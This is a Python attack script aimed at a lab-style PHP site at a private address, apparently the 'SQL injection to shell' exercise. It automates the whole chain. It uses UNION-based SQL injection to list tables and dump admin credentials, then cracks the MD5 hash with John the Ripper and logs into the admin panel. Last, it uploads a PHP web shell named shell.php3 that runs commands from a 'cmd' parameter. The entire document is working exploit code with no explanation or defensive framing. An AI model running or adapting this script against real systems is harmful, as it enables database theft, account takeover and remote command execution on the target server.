import subprocess
import requests
from requests import Request, Session
from bs4 import BeautifulSoup

##DECLARE VARIABLES##
HOST 		= "http://10.0.2.8/"
php 		= "cat.php?id="
test 		= ""
injection 	= ""
i 			= 0
columns 	= 0

##START REQUESTS SESSION##
s = requests.Session()


##FIND NUMBER OF COLUMNS IN TABLE##
while i < 10:
	print("testing for %i columns"% (i+1))
	injection = "1 order by " + str(i+1)
	test  = HOST + php + injection
	r = requests.get(test)

	if 'order clause' in r.text:
		break
	i += 1

print("\nThere are %i columns\n"% (i))

##FIND INJECTABLE COLUMN##
columns = i
injection = "1 union select 1"

for x in range(1, columns):
	injection = injection + "," + str(x+1)

test  = HOST + php + injection
r = requests.get(test)
i = 1

while i < 5:
	print("testing column %i"% (i))
	if "Picture: " + str(i) in r.text:
		break
	i += 1

print("\nColumn %i is injectable\n"%(i))

##FIND VERSION##

ver = HOST + php + "1 union select 1,@@version,3,4"
r = requests.get(ver)

soup = BeautifulSoup(r.text, 'lxml')

html = soup.find(src="admin/uploads/3")

print("MySQL Version: " + html["alt"] + "\n")

##FIND CURRENT USER##

user = HOST + php + "1 union select 1,current_user(),3,4"
r = requests.get(user)

soup = BeautifulSoup(r.text, 'lxml')

html = soup.find(src="admin/uploads/3")

print("Current User: " + html["alt"] + "\n")

##FIND DATABASE##

user = HOST + php + "1 union select 1,database(),3,4"
r = requests.get(user)

soup = BeautifulSoup(r.text, 'lxml')

html = soup.find(src="admin/uploads/3")

print("Database: " + html["alt"] + "\n")

##FIND TABLE AND COLUMNS##

user_tables_req = HOST + php + "1 union select 1,concat(table_name,' ',column_name),3,4 from information_schema.columns"

r = requests.get(user_tables_req)

soup = BeautifulSoup(r.text, "lxml")

imgs = soup.find_all("img")

table = [x["alt"].split()[0] for x in imgs if "user" in x["alt"]][0]

columns = [x["alt"].split()[1] for x in imgs if "user" in x["alt"]]

print("Table Name: " + table + "\n")

print("Columns in " + table + ":")

for c in columns:
	print(c)

##QUERY TO SHOW LOGIN AND PASSWORD###

inj_start =  "1 union select 1,"
inj_end = ",3,4 from " + table

inj_mid = "concat("
seq = ",':',"

##BUILD INJECTION MIDDLE)
inj_mid = inj_mid + seq.join(columns) + ")"

injection = inj_start + inj_mid + inj_end

admin_creds = HOST + php + injection

r = requests.get(admin_creds)

soup = BeautifulSoup(r.text, "lxml")

##SPLIT UP INDIVIDUAL CREDS IN QUERY RESPONSE##

creds = soup.find(src="admin/uploads/3")["alt"].split(":")

print("\nADMIN CREDENTIALS\n")
seq = ":"

for i in range(0,len(columns)):
	print(columns[i] + ":  " + creds[i])

##JUST FOR FORMATTING##
print("")

john = seq.join([creds[1],creds[2]])

f = open("sqli_to_shell_creds.txt", "r+")
f.write(john)

##RUN JOHN THE RIPPER, UPDATE ADMIN CREDS WITH PLAINTEXT PASSWORD##

johnny = subprocess.check_output(["john","--show","--format=Raw-MD5","sqli_to_shell_creds.txt"]).decode("utf-8").split()

for j in johnny:
	if creds[1] in j:

		creds[2] = j.split(":")[1]

f.close()

##SET UP HEADERS AND PAYLOAD FOR LOG IN W/ ADMIN CREDS
headers = {"User-Agent" : "Mozilla/5.0"}
payload= {"user" : creds[1], "password" : creds[2]}

#JUST IN CASE THE SESSIOIN SHOULD HAVE DATA BEFORE LOG IN ATTEMPTS
r = s.get(HOST + "admin/", headers=headers,)

#JUST IN CASE THE REFERER IS IMPORTANT TO THE QUERY
headers.update({"Referer": HOST + "admin/login.php"})

r = s.post(HOST + "admin/index.php", headers=headers, data=payload)

#USE STRING TO CONFIRM LOG IN
logged_in = "Administration" in r.text

if logged_in:
	print("LOGGED IN!")


#USE SAME SESSION
r = s.get(HOST + "admin/new.php", headers=headers)

headers["Referer"] = HOST + "admin/new.php"


##SET UP DATA FOR INJECTING SHELL INTO PHP SERVER
title = "hax"
files={"image": ("shell.php3", "<?php\n\tsystem($_GET['cmd']);\n?>")}

category = "1"

data = {"title": title, "category": category}

#PERFORM UPLOAD
r = s.post(HOST + "admin/index.php", headers=headers, data=data, files=files)

soup = BeautifulSoup(r.text, "lxml")

#FIND LOCATION OF INJECTION
imgs = soup.find_all("a")

hax = ""

for i in imgs:
	if "hax" in i:
		hax = i["href"][3:]

r = s.get(HOST + hax)

soup = BeautifulSoup(r.text, "lxml")

#THIS SHOULD BE THE LOCATION OF THE SHELL ON THE SERVER
hax_img = soup.find(alt="hax")["src"]

#SETUP URL FOR COMMAND EXECUTION
hax_page = HOST + hax_img + "?cmd="

print("SHELL INJECTED TO " + hax_page)

print("TESTING SHELL INJECTION\nSending command 'ls /'\n\nOutput:")

cmd = "ls /"

r = s.get(hax_page + cmd)

print(r.text)

r.close()
s.close()
